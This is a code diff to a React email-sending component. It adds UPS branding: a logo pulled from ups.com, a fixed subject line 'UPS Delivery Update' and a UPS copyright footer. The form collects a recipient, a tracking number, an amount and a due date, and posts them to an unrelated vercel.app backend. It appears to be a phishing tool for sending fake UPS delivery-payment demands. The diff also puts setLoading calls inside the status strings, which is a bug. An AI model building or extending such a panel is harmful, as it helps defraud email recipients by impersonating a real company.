@@ -12,10 +12,12 @@ const EmailSender = () => {
     const [dueDate, setDueDate] = useState("");
    
     const [status, setStatus] = useState(null);
+    const [loading, setLoading] = useState(false)
 
     // Function to handle sending email
     const sendEmail = async () => {
         try {
+            setLoading(true)
             const response = await fetch("https://back-one-navy.vercel.app/auth/send-email", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -23,23 +25,37 @@ const EmailSender = () => {
             });
             
             const data = await response.json();
-            setStatus(data.success ? "Email sent successfully!" : "Failed to send email.");
+            setStatus(data.success ? `Email sent successfully! ${setLoading(false)}` : `Failed to send email. ${setLoading(false)}`);
         } catch (error) {
+            setLoading(false)
             setStatus("Error sending email.");
         }
     };
 
     return (
         <div>
-            <h2>Send an Email</h2>
-            <input type="email" placeholder="Recipient Email" value={email} onChange={e => setEmail(e.target.value)} />
-            <input type="text" placeholder="Tracking Number" value={trackingNumber} onChange={e => setTrackingNumber(e.target.value)} />
-            <input type="text" placeholder="Subject" value={subject} onChange={e => setSubject(e.target.value)} />
-            <input type="number" placeholder="Amount" value={amount} onChange={e => setAmount(e.target.value)} />
-            <input type="text" placeholder="Due date" value={dueDate} onChange={e => setDueDate(e.target.value)} />
-            <button onClick={sendEmail}>Send Email</button>
+             <div className="nav">
+    <div><Link to="/" ><img src="https://www.ups.com/webassets/icons/logo.svg" className="logo"/></Link></div>
+    <div> <Link to="/login" className="button2">Track</Link></div>
+  </div>
+
+  <div className="cover">
+<div className="homepage">
+  <div className="content">
+            <h1>Send an Email</h1>
+            <input type="email" placeholder="Recipient Email" value={email} onChange={e => setEmail(e.target.value)}  className="input" />
+            <input type="text" placeholder="Tracking Number" value={trackingNumber} onChange={e => setTrackingNumber(e.target.value)}  className="input" />
+            <input type="text" placeholder="Subject" value="UPS Delivery Update" onChange={e => setSubject(e.target.value)}  className="input" />
+            <input type="number" placeholder="Amount" value={amount} onChange={e => setAmount(e.target.value)}  className="input" />
+            <input type="text" placeholder="Due date" value={dueDate} onChange={e => setDueDate(e.target.value)}  className="input" />
+            <button onClick={sendEmail} className="subbtn" >{loading? 'Sending Email...' : 'Send email'}</button>
             {status && <p>{status}</p>}
         </div>
+        </div>
+        </div>
+        <div className="footer">Copyright ©1994-2025 United Parcel Service of America, Inc. All rights reserved.</div>        
+</div>
+
     );
 };
 
